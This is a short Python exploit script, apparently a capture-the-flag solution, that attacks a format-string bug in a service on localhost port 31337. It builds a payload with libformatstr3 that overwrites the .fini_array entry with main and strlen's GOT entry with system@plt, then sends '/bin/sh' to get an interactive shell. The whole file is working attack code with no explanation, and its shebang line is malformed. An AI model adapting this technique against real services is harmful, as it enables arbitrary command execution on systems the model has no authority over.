#!/ /usr/bin/env python3

from libformatstr3 import FormatStr
import struct
import sys
import telnetlib


HOST='localhost'
PORT=31337

def main():

    # GOT Overrite
    system_plt = 0x08048490
    strlen_got = 0x08049a54

    fini_array = 0x08049934
    main = 0x080485ed
    
    ret2main = '%19$08xx'
    
    tn = telnetlib.Telnet(HOST, PORT)

    p = FormatStr()
    p[fini_array] = [main]
    p[strlen_got] = [system_plt]
    
    payload  = p.payload(12, 2, len('Nice to meet you, '))
    payload += b'\n'
    
    tn.read_until(b'name... ')
    tn.write(payload)
    tn.read_until(b'name... ')
    tn.write(b'/bin/sh\n')
    tn.interact()
    
if __name__ == '__main__':
    main()
